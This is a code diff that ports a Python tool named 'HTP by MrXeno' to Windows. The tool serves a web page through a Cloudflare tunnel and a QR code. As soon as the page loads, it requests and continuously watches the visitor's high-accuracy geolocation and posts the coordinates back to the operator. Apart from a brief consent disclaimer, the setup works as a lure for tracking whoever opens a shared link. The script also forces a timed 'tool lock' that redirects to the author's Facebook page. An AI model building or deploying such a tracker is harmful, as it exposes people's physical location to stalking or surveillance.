@@ -1,7 +1,11 @@
 #!/usr/bin/env python3
-
-# HTP by MrXeno - FULL AUTO INSTALL + CLOUDFLARE
-# IMPORTANT: Use this only on devices YOU OWN or with EXPLICIT CONSENT.
+"""
+Windows-friendly HTP.py
+- Fixed f-string HTML issue
+- Windows/Linux cloudflared detection and download
+- Avoids Linux-only commands on Windows
+IMPORTANT: Use this only on devices YOU OWN or with EXPLICIT CONSENT.
+"""
 
 import os
 import sys
@@ -9,15 +13,17 @@ import threading
 import time
 import re
 import subprocess
+import platform
+import webbrowser
 from pathlib import Path
 
 try:
     import requests
     from flask import Flask, request
 except ImportError:
-    print("Installing missing Python packages...")
-    os.system('pkg install python wget -y')
-    os.system('pip install flask requests qrcode[pil]')
+    print("Installing missing Python packages (you may need to run this as admin)...")
+    os.system('pip install --upgrade pip setuptools wheel')
+    os.system('pip install flask requests qrcode[pil] pillow')
     import requests
     from flask import Flask, request
 
@@ -31,9 +37,23 @@ RESET = "\033[0m"
 app = Flask(__name__)
 locations = {}
 
+# ---------------- Helpers ----------------
+def clear_screen():
+    if os.name == "nt":
+        os.system("cls")
+    else:
+        os.system("clear")
+
+def open_url(url):
+    try:
+        webbrowser.open(url)
+    except Exception:
+        # best-effort, don't crash
+        pass
+
 # ---------------- TOOL LOCK ----------------
 def tool_lock():
-    os.system("clear")
+    clear_screen()
     print(f"{RED}╔{'═'*60}╗{RESET}")
     print(f"{RED}║{'🔒 TOOL LOCKED 🔒'.center(60)}║{RESET}")
     print(f"{RED}║{'HTP BY MrXeno'.center(60)}║{RESET}")
@@ -46,71 +66,136 @@ def tool_lock():
         sys.stdout.flush()
         time.sleep(1)
 
-    os.system('am start -a android.intent.action.VIEW -d "https://facebook.com/mrrajrumel" > /dev/null 2>&1 || true')
-    print(f"\n{GREEN}✅ Redirected to Facebook (if available).{RESET}\n")
-    input(f"{YELLOW}Press ENTER to continue...{RESET}")
+    # Try to open the Facebook page in a cross-platform manner
+    fb_url = "https://facebook.com/mrrajrumel"
+    try:
+        open_url(fb_url)
+        print(f"\n{GREEN}✅ Opened Facebook link (if a browser is available).{RESET}\n")
+    except Exception:
+        print(f"\n{YELLOW}⚠️ Could not open browser automatically. Visit: {fb_url}{RESET}\n")
+
+    try:
+        input(f"{YELLOW}Press ENTER to continue...{RESET}")
+    except Exception:
+        # non-interactive fallback
+        pass
 
 # ---------------- Dependencies ----------------
 def install_requirements():
     print(f"{CYAN}Checking/attempting to install requirements...{RESET}")
-    os.system('pkg update -y > /dev/null 2>&1 || true')
-    os.system('pkg install python wget -y > /dev/null 2>&1 || true')
-    os.system('pip install flask requests qrcode[pil] > /dev/null 2>&1 || true')
+    if os.name != "nt":
+        os.system('pkg update -y > /dev/null 2>&1 || true')
+        os.system('pkg install python wget -y > /dev/null 2>&1 || true')
+    os.system('pip install flask requests qrcode[pil] pillow > /dev/null 2>&1 || true')
 
 # ---------------- Cloudflared ----------------
-def download_cloudflared():
-    arch = subprocess.getoutput("uname -m")
-    url = ""
-    if arch == "aarch64":
-        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
-    elif arch.startswith("arm"):
-        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
-    elif arch in ["x86_64", "amd64"]:
-        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
-    else:
-        print(f"{RED}Unsupported CPU architecture: {arch}{RESET}")
+def download_file(url, dest_path):
+    dest_path.parent.mkdir(parents=True, exist_ok=True)
+    try:
+        with requests.get(url, stream=True, timeout=30) as r:
+            r.raise_for_status()
+            with open(dest_path, "wb") as f:
+                for chunk in r.iter_content(chunk_size=8192):
+                    if chunk:
+                        f.write(chunk)
+        return True
+    except Exception as e:
+        print(f"{YELLOW}⚠️ Download failed: {e}{RESET}")
         return False
 
-    # Determine installation path
-    if "com.termux" in os.environ.get("PREFIX", ""):
-        path = Path(os.environ.get("PREFIX")) / "bin/cloudflared"
+def download_cloudflared():
+    system = platform.system().lower()
+    machine = platform.machine().lower()
+    bin_dir = Path.cwd() / "bin"
+    bin_dir.mkdir(exist_ok=True)
+    # Default target path
+    if system == "windows":
+        path = bin_dir / "cloudflared.exe"
     else:
-        path = Path("/usr/local/bin/cloudflared")
+        path = bin_dir / "cloudflared"
 
-    if not path.exists():
-        print(f"{CYAN}Downloading cloudflared for {arch}...{RESET}")
-        os.system(f"wget -q {url} -O {path}")
-        os.system(f"chmod +x {path}")
-        print(f"{GREEN}✅ cloudflared installed at {path}{RESET}")
-    return True
+    if path.exists():
+        return path
 
-def start_cloudflared_tunnel(port=8080, timeout=15):
-    if not download_cloudflared():
+    print(f"{CYAN}Detecting platform: system={system}, machine={machine}{RESET}")
+
+    # Choose correct URL
+    if system == "windows":
+        # choose amd64 vs 386
+        if "64" in machine:
+            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
+        else:
+            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-386.exe"
+    elif system == "linux":
+        if "aarch64" in machine or "arm64" in machine:
+            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
+        elif machine.startswith("arm"):
+            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
+        else:
+            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
+    elif system == "darwin":
+        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
+    else:
+        print(f"{RED}Unsupported platform: {system}/{machine}{RESET}")
+        return None
+
+    print(f"{CYAN}Downloading cloudflared from: {url}{RESET}")
+    ok = download_file(url, path)
+    if not ok:
+        print(f"{YELLOW}Could not download cloudflared automatically.{RESET}")
+        return None
+
+    try:
+        # Make executable on POSIX
+        if system != "windows":
+            path.chmod(0o755)
+    except Exception:
+        pass
+
+    print(f"{GREEN}✅ cloudflared saved to: {path}{RESET}")
+    return path
+
+def find_cloudflared():
+    # 1) check local bin/
+    local = Path.cwd() / "bin" / ("cloudflared.exe" if os.name == "nt" else "cloudflared")
+    if local.exists():
+        return local
+    # 2) check PATH
+    which = shutil_which("cloudflared")
+    if which:
+        return Path(which)
+    # 3) try download
+    return download_cloudflared()
+
+def shutil_which(name):
+    try:
+        from shutil import which
+        return which(name)
+    except Exception:
+        return None
+
+def start_cloudflared_tunnel(port=8080, timeout=20):
+    cloud_path = find_cloudflared()
+    if not cloud_path:
+        print(f"{YELLOW}⚠️ cloudflared not available locally.{RESET}")
         return None, None
 
-    if "com.termux" in os.environ.get("PREFIX", ""):
-        cloudflared_path = Path(os.environ.get("PREFIX")) / "bin/cloudflared"
-    else:
-        cloudflared_path = Path("/usr/local/bin/cloudflared")
-
-    cmd = [str(cloudflared_path), "tunnel", "--url", f"http://localhost:{port}"]
-
+    cmd = [str(cloud_path), "tunnel", "--url", f"http://localhost:{port}"]
+    print(f"{CYAN}Starting cloudflared: {' '.join(cmd)}{RESET}")
     try:
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
     except Exception as e:
         print(f"{RED}Failed to start cloudflared: {e}{RESET}")
         return None, None
 
-    url = None
     pattern = re.compile(r"https://[a-z0-9\-]+\.trycloudflare\.com", re.IGNORECASE)
+    url = None
     start = time.time()
-
     while time.time() - start < timeout:
         line = proc.stdout.readline()
         if not line:
             time.sleep(0.1)
             continue
-
         print(f"{YELLOW}Cloudflared: {line.strip()}{RESET}")
         m = pattern.search(line)
         if m:
@@ -118,14 +203,15 @@ def start_cloudflared_tunnel(port=8080, timeout=15):
             break
 
     if url:
+        # keep process alive in background
         threading.Thread(target=lambda p: p.wait(), args=(proc,), daemon=True).start()
         return url, proc
 
+    # no url found -> kill
     try:
         proc.kill()
     except Exception:
         pass
-
     return None, None
 
 def get_public_ip():
@@ -137,23 +223,22 @@ def get_public_ip():
         return None
 
 def create_public_url(port=8080):
-    url, proc = start_cloudflared_tunnel(port=port, timeout=15)
+    url, proc = start_cloudflared_tunnel(port=port, timeout=18)
     if url:
         print(f"{GREEN}✅ Cloudflare tunnel established: {url}{RESET}")
         return url
-
     print(f"{YELLOW}⚠️  Cloudflare tunnel failed, trying public IP...{RESET}")
     ip = get_public_ip()
     if ip:
         print(f"{GREEN}✅ Using public IP: {ip}{RESET}")
         return f"http://{ip}:{port}"
-
     print(f"{YELLOW}⚠️  Could not determine public IP, using localhost{RESET}")
     return f"http://localhost:{port}"
 
 # ---------------- Flask endpoints ----------------
 @app.route("/")
 def index():
+    # Note: this is NOT an f-string; no leading f to avoid brace issues
     return '''<!DOCTYPE html>
 <html>
 <head>
@@ -219,7 +304,7 @@ def index():
                         speed: pos.coords.speed || null,
                         timestamp: pos.timestamp
                     })
-                }).catch(err => console.error('Error:', err));
+                }).catch(function(err) { console.error('Error:', err); });
             } catch(e) {
                 console.error('Error:', e);
             }
@@ -238,27 +323,37 @@ def index():
         function requestLocation() {
             if (navigator.geolocation) {
                 statusDiv.innerHTML = 'Requesting location access...';
+                
+                // First try to get current position
                 navigator.geolocation.getCurrentPosition(
-                    pos => {
+                    function(pos) {
                         onSuccess(pos);
+                        // Then watch for updates
                         watchId = navigator.geolocation.watchPosition(onSuccess, onError, {
                             enableHighAccuracy: true,
                             maximumAge: 3000,
                             timeout: 10000
                         });
-                    },
-                    onError,
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    }, 
+                    onError, 
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
                 );
             } else {
                 statusDiv.innerHTML = 'Geolocation is not supported by this browser.';
                 messageDiv.innerHTML = 'Please use a browser that supports location services';
             }
         }
+        
+        // Request location on page load
         window.onload = requestLocation;
     </script>
 </body>
-</html>'''
+</html>
+'''
 
 @app.route("/update", methods=["POST"])
 def update():
@@ -293,7 +388,16 @@ def make_qr(url):
         out = Path("track_qr.png")
         img = qrcode.make(url)
         img.save(out)
-        os.system(f"termux-open {out} > /dev/null 2>&1 || xdg-open {out} > /dev/null 2>&1 || true")
+        # cross-platform open
+        try:
+            if os.name == "nt":
+                os.startfile(str(out.resolve()))
+            else:
+                # try termux-open, xdg-open, or webbrowser fallback
+                os.system(f"termux-open {out} > /dev/null 2>&1 || xdg-open {out} > /dev/null 2>&1 || true")
+                webbrowser.open(str(out.resolve()))
+        except Exception:
+            webbrowser.open(str(out.resolve()))
     except Exception as e:
         print(f"{YELLOW}⚠️  Could not generate QR code: {e}{RESET}")
 
@@ -311,7 +415,7 @@ def start_server(port=8080):
 def main():
     tool_lock()
     install_requirements()
-    os.system("clear")
+    clear_screen()
     print(f"{GREEN}🚀 Starting HTP...{RESET}")
 
     port = 8080
